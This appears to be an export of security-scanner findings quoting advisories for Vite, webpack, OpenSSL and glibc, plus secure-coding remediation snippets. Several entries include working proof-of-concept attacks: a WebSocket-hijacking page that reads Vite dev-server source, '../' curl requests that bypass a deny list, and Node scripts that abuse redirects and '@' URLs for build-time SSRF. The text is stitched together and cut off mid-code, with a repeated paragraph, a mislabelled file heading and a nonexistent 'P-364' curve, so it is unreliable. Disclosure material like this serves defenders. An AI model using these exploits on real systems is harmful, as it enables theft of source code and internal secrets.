[3]: Lack of validation on the Host header for HTTP requests Users using HTTP for the development server and using a browser that is not Chrome 94+ may: - get the source code stolen by malicious websites - give the attacker access to functionalities that are not supposed to be exposed externally - Vite core does not have any functionality that causes changes somewhere else when receiving a request, but plugins may implement those functionalities and servers behind `server.proxy` may have those functionalities. Chrome 94+ users are not affected for [3], because [sending a request to a private network page from public non-HTTPS page is forbidden](https://developer.chrome.com/blog/private-network-access-update#chrome_94) since Chrome 94. ### Related Information Safari has [a bug that blocks requests to loopback addresses from HTTPS origins](https://bugs.webkit.org/show_bug.cgi?id=171934). This means when the user is using Safari and Vite is listening on lookback addresses, there's another condition of ""the malicious web page is served on HTTP"" to make [1] and [2] to work. ### PoC #### [2]: Lack of validation on the Origin header for WebSocket connections 1. I used the `react` template which utilizes HMR functionality. ``` npm create vite@latest my-vue-app-react -- --template react ``` 2. Then on a malicious server, serve the following POC html: ```html <!doctype html> <html lang=""en""> <head> <meta charset=""utf-8"" /> <title>vite CSWSH</title> </head> <body> <div id=""logs""></div> <script> const div = document.querySelectorAll('#logs')[0]; const ws = new WebSocket('ws://localhost:5173','vite-hmr'); ws.onmessage = event => { const logLine = document.createElement('p'); logLine.innerHTML = event.data; div.append(logLine); }; </script> </body> </html> ``` 3. Kick off Vite ``` npm run dev ``` 4. Load the development server (open `http://localhost:5173/`) as well as the malicious page in the browser. 5. Edit `src/App.jsx` file and intentionally place a syntax error 6. Notice how the malicious page can view the websocket messages and a snippet of the source code is exposed Here's a video demonstrating the POC: https://github.com/user-attachments/assets/a4ad05cd-0b34-461c-9ff6-d7c8663d6961",GHSA-vg6x-rcgg-rjx6

It returns the [viteServePublicMiddleware](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L106) function which runs the needed tests and serves the page. The viteServePublicMiddleware function [checks if the publicFiles variable is defined](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L111), and then uses it to determine if the requested page is public. In the case that the publicFiles is undefined, the code will treat the requested page as a public page, and go on with the serving function. [publicFiles may be undefined if there is a symbolic link anywhere inside the public directory](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/publicDir.ts#L21). In that case, every requested page will be passed to the public serving function. The serving function is based on the [sirv](https://github.com/lukeed/sirv) library. Vite patches the library to add the possibility to test loading access to pages, but when the public page middleware [disables this functionality](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L89) since public pages are meant to be available always, regardless of whether they are in the allow or deny list. In the case of public pages, the serving function is [provided with the path to the public directory](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L85) as a root directory. The code of the sirv library [uses the join function to get the full path to the requested file](https://github.com/lukeed/sirv/blob/d061616827dd32d53b61ec9530c9445c8f592620/packages/sirv/index.mjs#L42). For example, if the public directory is ""/www/public"", and the requested file is ""myfile"", the code will join them to the string ""/www/public/myfile"". The code will then pass this string to the normalize function. Afterwards, the code will [use the string's startsWith function](https://github.com/lukeed/sirv/blob/d061616827dd32d53b61ec9530c9445c8f592620/packages/sirv/index.mjs#L43) to determine whether the created path is within the given directory or not. Only if it is, it will be served. Since [sirv trims the trailing slash of the public directory](https://github.com/lukeed/sirv/blob/d061616827dd32d53b61ec9530c9445c8f592620/packages/sirv/index.mjs#L119), the string's startsWith function may return true even if the created path is not within the public directory. For example, if the server's root is at ""/www"", and the public directory is at ""/www/p"", if the created path will be ""/www/private.txt"", the startsWith function will still return true, because the string ""/www/private.txt"" starts with ""/www/p"". To achieve this, the attacker will use "".."" to ask for the file ""../private.txt"". The code will then join it to the ""/www/p"" string, and will receive ""/www/p/../private.txt"". Then, the normalize function will return ""/www/private.txt"", which will then be passed to the startsWith function, which will return true, and the processing of the page will continue without checking the deny list (since this is the public directory middleware which doesn't check that). ### PoC Execute the following shell commands: ``` npm create vite@latest cd vite-project/ mkdir p cd p ln -s a b cd .. echo 'import path from ""node:path""; import { defineConfig } from ""vite""; export default defineConfig({publicDir: path.resolve(__dirname, ""p/""), server: {fs: {deny: [path.resolve(__dirname, ""private.txt"")]}}})' > vite.config.js echo ""secret"" > private.txt npm install npm run dev ``` Then, in a different shell, run the following command: `curl -v --path-as-is 'http://localhost:5173/private.txt'` You will receive a 403 HTTP Response, because private.txt is denied. Now in the same shell run the following command: `curl -v --path-as-is 'http://localhost:5173/../private.txt'` You will receive the contents of private.txt. ### Related links - https://github.com/lukeed/sirv/commit/f0113f3f8266328d804ee808f763a3c11f8997eb",GHSA-g4jq-h2w9-997c

DEPCHECK-BROKEN-CRYSTALS-065,dep-check,broken-crystals,sca,CWE-918,LOW,webpack:5.96.1,"### Summary When `experiments.buildHttp` is enabled, webpack’s HTTP(S) resolver (`HttpUriPlugin`) enforces `allowedUris` only for the **initial** URL, but **does not re-validate `allowedUris` after following HTTP 30x redirects**. As a result, an import that appears restricted to a trusted allow-list can be redirected to **HTTP(S) URLs outside the allow-list**. This is a **policy/allow-list bypass** that enables **build-time SSRF behavior** (requests from the build machine to internal-only endpoints, depending on network access) and **untrusted content inclusion in build outputs** (redirected content is treated as module source and bundled). In my reproduction, the internal response is also persisted in the buildHttp cache. ### Details In the HTTP scheme resolver, the allow-list check (`allowedUris`) is performed when metadata/info is created for the original request (via `getInfo()`), but the content-fetch path follows redirects by resolving the `Location` URL without re-checking whether the redirected URL is within `allowedUris`. Practical consequence: if an “allowed” host/path can return a 302 (or has an open redirect), it can point to an external URL or an internal-only URL (SSRF). The redirected response is consumed as module content, bundled, and can be cached. If the redirect target is attacker-controlled, this can potentially result in attacker-controlled JavaScript being bundled and later executed when the resulting bundle runs. **Figure 1 (evidence screenshot):** left pane shows the allowed host issuing a 302 redirect to `http://127.0.0.1:9100/secret.js`; right pane shows the build output confirming allow-list bypass and that the secret appears in the bundle and buildHttp cache. <img width=""1648"" height=""461"" alt=""image"" src=""https://github.com/user-attachments/assets/bb25f3ff-1919-49f9-951b-ad50bf0c7524"" /> ### PoC This PoC is intentionally constrained to **127.0.0.1** (localhost-only “internal service”) to demonstrate SSRF behavior safely. #### 1) Setup ```bash mkdir split-ssrf-poc && cd split-ssrf-poc npm init -y npm i -D webpack webpack-cli ``` #### 2) Create server.js ```js #!/usr/bin/env node ""use strict""; const http = require(""http""); const url = require(""url""); const allowedPort = 9000; const internalPort = 9100; const internalUrlDefault = `http://127.0.0.1:${internalPort}/secret.js`; const secret = `INTERNAL_ONLY_SECRET_${Math.random().toString(16).slice(2)}`; const internalPayload = `export const secret = ${JSON.stringify(secret)};\n` + `export default ""ok"";\n`; function start(port, handler) { return new Promise(resolve => { const s = http.createServer(handler); s.listen(port, ""127.0.0.1"", () => resolve(s)); }); } (async () => { // Internal-only service (SSRF target) await start(internalPort, (req, res) => { if (req.url === ""/secret.js"") { res.statusCode = 200; res.setHeader(""Content-Type"", ""application/javascript; charset=utf-8""); res.end(internalPayload); console.log(`[internal] 200 /secret.js served (secret=${secret})`); return; } res.statusCode = 404; res.end(""not found""); }); // Allowed host (redirector) await start(allowedPort, (req, res) => { const parsed = url.parse(req.url, true); if (parsed.pathname === ""/redirect.js"") { const to = parsed.query.to || internalUrlDefault; // Safety guard: only allow redirecting to localhost internal service in this PoC if (!to.startsWith(`http://127.0.0.1:${internalPort}/`)) { res.statusCode = 400; res.end(""to must be internal-only in this PoC""); console.log(`[allowed] blocked redirect to: ${to}`); return; } res.statusCode = 302; res.setHeader(""Location"", to); res.end(""redirecting""); console.log(`[allowed] 302 /redirect.js -> ${to}`); return; } res.statusCode = 404; res.end(""not found""); }); console.log(`\nServer running:`); console.log(`- allowed host: http://127.0.0.1:${allowedPort}/redirect.js`); console.log(`- internal-only: http://127.0.0.1:${internalPort}/secret.js`); })(); ``` #### 3) Create attacker.js ```js #!/usr/bin/env node ""use strict""; const path = require(""path""); const os = require(""os""); const fs = require(""fs/promises""); const webpack = require(""webpack""); const webpackPkg = require(""webpack/package.json""); const allowedPort = 9000; const internalPort = 9100; const allowedBase = `http://127.0.0.1:${allowedPort}/`; const internalTarget = `http://127.0.0.1:${internalPort}/secret.js`; const entryUrl = `${allowedBase}redirect.js?to=${encodeURIComponent(internalTarget)}`; async function walk(dir) { const out = []; const items = await fs.readdir(dir, { withFileTypes: true }); for (const it of items) { const p = path.join(dir, it.name); if (it.isDirectory()) out.push(...await walk(p)); else if (it.isFile()) out.push(p); } return out; } async function fileContains(f, needle) { try { const buf = await fs.readFile(f); return buf.toString(""utf8"").includes(needle) || buf.toString(""latin1"").includes(needle); } catch { return false; } } async function findInFiles(files, needle) { const hits = []; for (const f of files) if (await fileContains(f, needle)) hits.push(f); return hits; } const fmtBool = b => (b ?

If `allowedUris` enforcement relies on a **raw string prefix check** (e.g., `uri.startsWith(allowed)`), a URL that *looks* allow-listed can pass validation while the actual network request is sent to a different authority/host after URL parsing. This is a **policy/allow-list bypass** that enables **build-time SSRF behavior** (outbound requests from the build machine to internal-only endpoints, depending on network access) and **untrusted content inclusion** (the fetched response is treated as module source and bundled). In my reproduction, the internal response was also persisted in the buildHttp cache. Reproduced on: - webpack version: **5.104.0** - Node version: **v18.19.1** ### Details **Root cause (high level):** `allowedUris` validation can be performed on the raw URI string, while the actual request destination is determined later by parsing the URL (e.g., `new URL(uri)`), which interprets the **authority** as the part after `@`. Example crafted URL: - `http://127.0.0.1:9000@127.0.0.1:9100/secret.js` If the allow-list is `[""http://127.0.0.1:9000""]`, then: - Raw string check: `crafted.startsWith(""http://127.0.0.1:9000"")` → **true** - URL parsing (WHAT `new URL()` will contact): `origin` → `http://127.0.0.1:9100` (host/port after `@`) As a result, webpack fetches `http://127.0.0.1:9100/secret.js` even though `allowedUris` only included `http://127.0.0.1:9000`. **Evidence from reproduction:** - Server logs showed the internal-only endpoint being fetched: - `[internal] 200 /secret.js served (...)` (observed multiple times) - Attacker-side build output showed: - the internal secret marker was present in the **bundle** - the internal secret marker was present in the **buildHttp cache** <img width=""1651"" height=""381"" alt=""image-2"" src=""https://github.com/user-attachments/assets/8fd81b35-0d4f-424b-b60e-0a2582a8b492"" /> ### PoC This PoC is intentionally constrained to **127.0.0.1** (localhost-only “internal service”) to demonstrate SSRF behavior safely. #### 1) Setup ```bash mkdir split-userinfo-poc && cd split-userinfo-poc npm init -y npm i -D webpack webpack-cli ``` #### 2) Create server.js ```js #!/usr/bin/env node ""use strict""; const http = require(""http""); const ALLOWED_PORT = 9000; // allowlisted-looking host const INTERNAL_PORT = 9100; // actual target if bypass succeeds const secret = `INTERNAL_ONLY_SECRET_${Math.random().toString(16).slice(2)}`; const internalPayload = `// internal-only\n` + `export const secret = ${JSON.stringify(secret)};\n` + `export default ""ok"";\n`; function listen(port, handler) { return new Promise(resolve => { const s = http.createServer(handler); s.listen(port, ""127.0.0.1"", () => resolve(s)); }); } (async () => { // ""Allowed"" host (should NOT be contacted if bypass works as intended) await listen(ALLOWED_PORT, (req, res) => { console.log(`[allowed-host] ${req.method} ${req.url} (should NOT be hit in userinfo bypass)`); res.statusCode = 200; res.setHeader(""Content-Type"", ""application/javascript; charset=utf-8""); res.end(`export default ""ALLOWED_HOST_WAS_HIT_UNEXPECTEDLY"";\n`); }); // Internal-only service (SSRF-like target) await listen(INTERNAL_PORT, (req, res) => { if (req.url === ""/secret.js"") { console.log(`[internal] 200 /secret.js served (secret=${secret})`); res.statusCode = 200; res.setHeader(""Content-Type"", ""application/javascript; charset=utf-8""); res.end(internalPayload); return; } console.log(`[internal] 404 ${req.method} ${req.url}`); res.statusCode = 404; res.end(""not found""); }); console.log(""\nServers up:""); console.log(`- allowed-host (should NOT be contacted): http://127.0.0.1:${ALLOWED_PORT}/`); console.log(`- internal target (should be contacted if vulnerable): http://127.0.0.1:${INTERNAL_PORT}/secret.js`); })(); ``` #### 2) Create server.js ```js #!/usr/bin/env node ""use strict""; const path = require(""path""); const os = require(""os""); const fs = require(""fs/promises""); const webpack = require(""webpack""); function fmtBool(b) { return b ?

Internally this function is used when parsing certificates that contain elliptic curve public keys in compressed form or explicit elliptic curve parameters with a base point encoded in compressed form. It is possible to trigger the infinite loop by crafting a certificate that has invalid explicit curve parameters. Since certificate parsing happens prior to verification of the certificate signature, any process that parses an externally supplied certificate may thus be subject to a denial of service attack. The infinite loop can also be reached when parsing crafted private keys as they can contain explicit elliptic curve parameters. Thus vulnerable situations include: - TLS clients consuming server certificates - TLS servers consuming client certificates - Hosting providers taking certificates or private keys from customers - Certificate authorities parsing certification requests from subscribers - Anything else which parses ASN.1 elliptic curve parameters Also any other applications that use the BN_mod_sqrt() where the attacker can control the parameter values are vulnerable to this DoS issue. In the OpenSSL 1.0.2 version the public key is not parsed during initial parsing of the certificate which makes it slightly harder to trigger the infinite loop. However any operation which requires the public key from the certificate will trigger the infinite loop. In particular the attacker can use a self-signed certificate to trigger the loop during verification of the certificate signature. This issue affects OpenSSL versions 1.0.2, 1.1.1 and 3.0.

Since certificate parsing happens prior to verification of the certificate signature, any process that parses an externally supplied certificate may thus be subject to a denial of service attack. The infinite loop can also be reached when parsing crafted private keys as they can contain explicit elliptic curve parameters. Thus vulnerable situations include: - TLS clients consuming server certificates - TLS servers consuming client certificates - Hosting providers taking certificates or private keys from customers - Certificate authorities parsing certification requests from subscribers - Anything else which parses ASN.1 elliptic curve parameters Also any other applications that use the BN_mod_sqrt() where the attacker can control the parameter values are vulnerable to this DoS issue. In the OpenSSL 1.0.2 version the public key is not parsed during initial parsing of the certificate which makes it slightly harder to trigger the infinite loop. However any operation which requires the public key from the certificate will trigger the infinite loop. In particular the attacker can use a self-signed certificate to trigger the loop during verification of the certificate signature. This issue affects OpenSSL versions 1.0.2, 1.1.1 and 3.0. It was addressed in the releases of 1.1.1n and 3.0.2 on the 15th March 2022. Fixed in OpenSSL 3.0.2 (Affected 3.0.0,3.0.1). Fixed in OpenSSL 1.1.1n (Affected 1.1.1-1.1.1m).

This contrasts with normal C strings which are repesented as a buffer for the string data which is terminated with a NUL (0) byte. Although not a strict requirement, ASN.1 strings that are parsed using OpenSSL's own ""d2i"" functions (and other similar parsing functions) as well as any string whose value has been set with the ASN1_STRING_set() function will additionally NUL terminate the byte array in the ASN1_STRING structure. However, it is possible for applications to directly construct valid ASN1_STRING structures which do not NUL terminate the byte array by directly setting the ""data"" and ""length"" fields in the ASN1_STRING array. This can also happen by using the ASN1_STRING_set0() function. Numerous OpenSSL functions that print ASN.1 data have been found to assume that the ASN1_STRING byte array will be NUL terminated, even though this is not guaranteed for strings that have been directly constructed. Where an application requests an ASN.1 structure to be printed, and where that ASN.1 structure contains ASN1_STRINGs that have been directly constructed by the application without NUL terminating the ""data"" field, then a read buffer overrun can occur. The same thing can also occur during name constraints processing of certificates (for example if a certificate has been directly constructed by the application instead of loading it via the OpenSSL parsing functions, and the certificate contains non NUL terminated ASN1_STRING structures). It can also occur in the X509_get1_email(), X509_REQ_get1_email() and X509_get1_ocsp() functions. If a malicious actor can cause an application to directly construct an ASN1_STRING and then process it through one of the affected OpenSSL functions then this issue could be hit.

This function behaves incorrectly when both GENERAL_NAMEs contain an EDIPARTYNAME. A NULL pointer dereference and a crash may occur leading to a possible denial of service attack. OpenSSL itself uses the GENERAL_NAME_cmp function for two purposes: 1) Comparing CRL distribution point names between an available CRL and a CRL distribution point embedded in an X509 certificate 2) When verifying that a timestamp response token signer matches the timestamp authority name (exposed via the API functions TS_RESP_verify_response and TS_RESP_verify_token) If an attacker can control both items being compared then that attacker could trigger a crash. For example if the attacker can trick a client or server into checking a malicious certificate against a malicious CRL then this may occur. Note that some applications automatically download CRLs based on a URL embedded in a certificate. This checking happens prior to the signatures on the certificate and CRL being verified. OpenSSL's s_server, s_client and verify tools have support for the ""-crl_download"" option which implements automatic CRL downloading and this attack has been demonstrated to work against those tools. Note that an unrelated bug means that affected versions of OpenSSL cannot parse or construct correct encodings of EDIPARTYNAME.

Impact summary: A stack buffer overflow may lead to a crash, causing Denial of Service, or potentially remote code execution. When parsing CMS (Auth)EnvelopedData structures that use AEAD ciphers such as AES-GCM, the IV (Initialization Vector) encoded in the ASN.1 parameters is copied into a fixed-size stack buffer without verifying that its length fits the destination. An attacker can supply a crafted CMS message with an oversized IV, causing a stack-based out-of-bounds write before any authentication or tag verification occurs. Applications and services that parse untrusted CMS or PKCS#7 content using AEAD ciphers (e.g., S/MIME (Auth)EnvelopedData with AES-GCM) are vulnerable. Because the overflow occurs prior to authentication, no valid key material is required to trigger it. While exploitability to remote code execution depends on platform and toolchain mitigations, the stack-based write primitive represents a severe risk. The FIPS modules in 3.6, 3.5, 3.4, 3.3 and 3.0 are not affected by this issue, as the CMS implementation is outside the OpenSSL FIPS module boundary.

Impact summary: The out-of-bounds write can cause a memory corruption which can have various consequences including a Denial of Service. The OPENSSL_uni2utf8() function performs a two-pass conversion of a PKCS#12 BMPString (UTF-16BE) to UTF-8. In the second pass, when emitting UTF-8 bytes, the helper function bmp_to_utf8() incorrectly forwards the remaining UTF-16 source byte count as the destination buffer capacity to UTF8_putc(). For BMP code points above U+07FF, UTF-8 requires three bytes, but the forwarded capacity can be just two bytes. UTF8_putc() then returns -1, and this negative value is added to the output length without validation, causing the length to become negative. The subsequent trailing NUL byte is then written at a negative offset, causing write outside of heap allocated buffer. The vulnerability is reachable via the public PKCS12_get_friendlyname() API when parsing attacker-controlled PKCS#12 files. While PKCS12_parse() uses a different code path that avoids this issue, PKCS12_get_friendlyname() directly invokes the vulnerable function. Exploitation requires an attacker to provide a malicious PKCS#12 file to be parsed by the application and the attacker can just trigger a one zero byte write before the allocated buffer. For that reason the issue was assessed as Low severity according to our Security Policy.

GRYPE-JUICE-SHOP-115,grype,juice-shop,container,,MEDIUM,libssl3@3.0.17-1~deb12u3,"Issue summary: An invalid or NULL pointer dereference can happen in an application processing a malformed PKCS#12 file. Impact summary: An application processing a malformed PKCS#12 file can be caused to dereference an invalid or NULL pointer on memory read, resulting in a Denial of Service. A type confusion vulnerability exists in PKCS#12 parsing code where an ASN1_TYPE union member is accessed without first validating the type, causing an invalid pointer read. The location is constrained to a 1-byte address space, meaning any attempted pointer manipulation can only target addresses between 0x00 and 0xFF. This range corresponds to the zero page, which is unmapped on most modern operating systems and will reliably result in a crash, leading only to a Denial of Service. Exploiting this issue also requires a user or application to process a maliciously crafted PKCS#12 file. It is uncommon to accept untrusted PKCS#12 files in applications as they are usually used to store private keys which are trusted by definition. For these reasons, the issue was assessed as Low severity. The FIPS modules in 3.5, 3.4, 3.3 and 3.0 are not affected by this issue, as the PKCS12 implementation is outside the OpenSSL FIPS module boundary. OpenSSL 3.6, 3.5, 3.4, 3.3, 3.0 and 1.1.1 are vulnerable to this issue. OpenSSL 1.0.2 is not affected by this issue.",CVE-2026-22795

Impact summary: This out-of-bounds write can cause memory corruption which typically results in a crash, leading to Denial of Service for an application. The line-buffering BIO filter (BIO_f_linebuffer) is not used by default in TLS/SSL data paths. In OpenSSL command-line applications, it is typically only pushed onto stdout/stderr on VMS systems. Third-party applications that explicitly use this filter with a BIO chain that can short-write and that write large, newline-free data influenced by an attacker would be affected. However, the circumstances where this could happen are unlikely to be under attacker control, and BIO_f_linebuffer is unlikely to be handling non-curated data controlled by an attacker. For that reason the issue was assessed as Low severity.

Note that the attacker must have control over both, the size as well as the alignment arguments of the memalign function to be able to exploit this. The size parameter must be close enough to PTRDIFF_MAX so as to overflow size_t along with the large alignment argument. This limits the malicious inputs for the alignment for memalign to the range [1<<62+ 1, 1<<63] and exactly 1<<63 for posix_memalign and aligned_alloc. Typically the alignment argument passed to such functions is a known constrained quantity (e.g. page size, block size, struct sizes) and is not attacker controlled, because of which this may not be easily exploitable in practice. An application bug could potentially result in the input alignment being too large, e.g. due to a different buffer overflow or integer overflow in the application or its dependent libraries, but that is again an uncommon usage pattern given typical sources of alignments.",CVE-2026-0861

Next, based on the bit size of the extracted nonce, one can compare the signing time of full-sized nonces to signatures that used smaller nonces, via statistical tests. There is a side-channel in the P-364 curve that allows private key extraction (also, there is a dependency between the bit size of K and the size of the side channel).

This practice can lead to SSRF vulnerabilities, where attackers exploit the application to send requests to unintended destinations. ```php $curl = curl_init(""https://{$_GET['host']}""); // unsafe ``` - **Do** validate or map user input against a predefined list of safe values before using it to form URLs.

This issue arises when an application directly uses input from the user to determine file paths or names without proper validation or sanitization.

This issue arises because some regular expressions can be processed with exponential time complexity. When attackers exploit this, it can significantly drain CPU resources, effectively causing a denial of service. ## Remediations - **Do** validate all dynamic and user-supplied input against a strict safelist of allowed characters before using it in regular expressions. This step helps prevent attackers from injecting malicious patterns. - **Do** restrict the length of input that can be processed. Limiting input size is a straightforward way to mitigate many ReDoS vulnerabilities. - **Do** implement timeouts for regular expression evaluation to avoid excessive resource consumption. This can be achieved using JavaScript environments or libraries that allow setting execution time limits. - **Do** simplify complex regular expressions to reduce the risk of catastrophic backtracking. Breaking down expressions into simpler parts makes them safer and more manageable. - **Do not** directly concatenate user input into regular expressions. This practice can introduce unsafe patterns and lead to vulnerabilities. ```javascript var dynamicRegex = new RegExp('^' + userInput); // unsafe ``` ## References - [OWASP Regular expression Denial of Service - ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)",
